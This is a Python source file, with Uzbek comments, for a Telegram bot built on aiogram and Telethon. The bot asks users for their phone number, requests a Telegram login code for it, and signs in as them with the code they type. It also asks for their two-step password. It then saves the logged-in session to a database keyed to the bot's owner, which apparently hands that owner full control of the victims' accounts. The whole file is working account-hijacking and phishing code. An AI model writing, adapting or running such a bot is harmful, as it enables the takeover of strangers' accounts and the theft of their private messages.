import re
from aiogram import Router, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State
from telethon.errors import SessionPasswordNeededError
from telethon import TelegramClient

from .session_service import get_session_path
from .config import API_ID, API_HASH
from .db import upsert_session  # 🔥 YANGI


class AuthState(StatesGroup):
    phone = State()
    code = State()
    password = State()


def create_router(texts, bot_id, owner_id):
    router = Router()
    phone_regex = re.compile(r"^\+?\d{9,15}$")

    @router.message(F.text == "/start")
    async def start_handler(message: Message, state: FSMContext):
        kb = ReplyKeyboardMarkup(
            keyboard=[
                [
                    KeyboardButton(
                        text=texts.get("contact_button", "📱 Contact"),
                        request_contact=True,
                    )
                ]
            ],
            resize_keyboard=True,
        )

        await state.set_state(AuthState.phone)
        await message.answer(texts.get("start", "Start"), reply_markup=kb)

    @router.message(F.contact)
    async def contact_handler(message: Message, state: FSMContext):
        phone = message.contact.phone_number
        await process_phone(message, state, phone)

    @router.message(AuthState.phone, F.text)
    async def text_phone_handler(message: Message, state: FSMContext):
        phone = message.text.strip()
        if not phone_regex.match(phone):
            await message.answer("Telefon: +998901234567 formatida yuboring")
            return

        await process_phone(message, state, phone)

    async def process_phone(message: Message, state: FSMContext, phone: str):
        user_id = message.from_user.id

        session_path = get_session_path(owner_id, bot_id, user_id)
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        try:
            result = await client.send_code_request(phone)
            await client.disconnect()
        except Exception as e:
            print("CODE REQUEST ERROR:", e)
            await message.answer(texts.get("error", "Xatolik"))
            return

        await state.set_state(AuthState.code)
        await state.update_data(phone=phone, code_hash=result.phone_code_hash)

        await message.answer(texts.get("code_request", "Kod kiriting"))

    @router.message(AuthState.code)
    async def code_handler(message: Message, state: FSMContext):
        data = await state.get_data()

        user_id = message.from_user.id
        phone = data["phone"]
        code_hash = data["code_hash"]
        code = message.text.strip()

        session_path = get_session_path(owner_id, bot_id, user_id)
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()

        try:
            await client.sign_in(phone=phone, code=code, phone_code_hash=code_hash)

            # 🔥 LOGIN MUVAFFAQIYATLI → DBga yozamiz
            await upsert_session(
                bot_id=bot_id, user_id=user_id, path=session_path, phone=phone
            )

            await client.disconnect()
            await state.clear()
            await message.answer(texts.get("success", "Success"))

        except SessionPasswordNeededError:
            await state.set_state(AuthState.password)
            await message.answer("2FA parolni kiriting")

        except Exception as e:
            print("SIGN IN ERROR:", e)
            await message.answer(texts.get("retry", "Qayta urinib ko‘ring"))

    return router
